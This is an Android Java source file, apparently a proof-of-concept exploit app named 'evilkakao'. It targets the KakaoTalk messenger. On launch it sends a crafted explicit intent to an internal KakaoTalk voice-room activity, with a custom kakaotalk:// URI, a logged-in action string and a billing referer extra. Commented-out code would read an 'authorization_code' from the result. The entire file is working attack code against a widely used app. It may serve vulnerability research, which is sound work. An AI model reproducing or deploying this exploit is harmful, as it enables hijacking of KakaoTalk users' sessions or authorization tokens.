package com.example.evilkakao;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.setClassName("com.kakao.talk", "com.kakao.talk.vox.vox30.ui.voiceroom.VoiceRoomActivity");
        intent.setData(Uri.parse("kakaotalk://style/foo"));
        intent.setAction("com.kakao.talk.intent.action.CAPRI_LOGGED_IN_ACTIVITY");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("BillingReferer", "talk_global_search");
        startActivity(intent);
        // startActivityForResult(intent, 0);
    }

    /*
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // String s = data.getStringExtra("authorization_code");
        Log.d("foo", String.valueOf(resultCode));
    }
    */
}